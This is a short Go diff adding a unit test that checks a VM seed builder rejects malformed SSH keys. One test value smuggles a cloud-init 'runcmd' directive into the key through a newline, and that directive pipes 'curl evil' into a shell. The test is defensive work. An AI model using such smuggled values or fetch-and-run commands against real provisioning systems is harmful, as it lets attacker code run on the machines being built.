@@ -59,3 +59,17 @@ func keys(m map[string]string) []string {
 	}
 	return out
 }
+
+func TestBuildSeedRejectsInjectionShapedKeys(t *testing.T) {
+	dir := t.TempDir()
+	m := &registry.Machine{Name: "t2", CPUs: 1, MemoryMiB: 1024, DiskGiB: 10, Image: "ubuntu:noble"}
+	for _, bad := range []string{
+		"ssh-ed25519 AAAA umbra\nruncmd:\n  - curl evil | sh",
+		"not-a-key AAAA",
+		"ssh-ed25519 AAAA\r umbra",
+	} {
+		if _, err := BuildSeed(m, dir, bad); err == nil {
+			t.Fatalf("BuildSeed accepted injection-shaped key %q", bad)
+		}
+	}
+}
